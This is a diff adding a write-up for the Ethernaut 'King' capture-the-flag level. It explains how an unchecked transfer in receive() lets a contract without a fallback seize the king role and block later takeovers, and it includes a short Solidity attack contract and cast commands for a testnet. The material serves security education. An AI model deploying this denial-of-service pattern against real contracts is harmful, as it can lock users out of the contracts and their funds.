@@ -301,3 +301,38 @@ contract Vault {
  cast storage $CONTRACT_ADDRESS 1 --rpc-url $SEPOLIA_RPC_URL
  cast send $CONTRACT_ADDRESS "unlock(bytes32)" $PASSWORD --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
 ```
+
+
+# 9: King
+**Level Link:** [King Challenge](https://ethernaut.openzeppelin.com/level/9)
+**Bug:** Unhandled transfer failure in receive()  
+**Objective:** Become king and prevent future takeovers
+**Vulnerability Analysis:**
+
+```solidity
+receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value); // ❌ Fails if king is contract without fallback
+    king = msg.sender; // Only executes if transfer succeeds
+    prize = msg.value;
+}
+```
+The objective of contract is whoever bids more than earlier will get the `king` position and the old king will get the money that the new `king` bids. Our goal is, the caller contract to take over the `king` position and block anyone else to take it over back. This could be possible if we don't have fallback functions in caller contract. Without transferring funds to the current king, no one can take over the `king` position.
+
+**Steps to Attack:**
+- Get the current `prize` value by using foundry call.
+- Deploy a contract which sends eth to `King` contract to take ownership.
+- contract shouldn't have receive() / fallback() functions.
+
+**Attack Contract:**
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    function attack(address payable  _contract) public payable {
+        // cast call $CONTRACT_ADDRESS "prize()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+        _contract.call{value:2000000000000000}('');
+    }
+}
+```
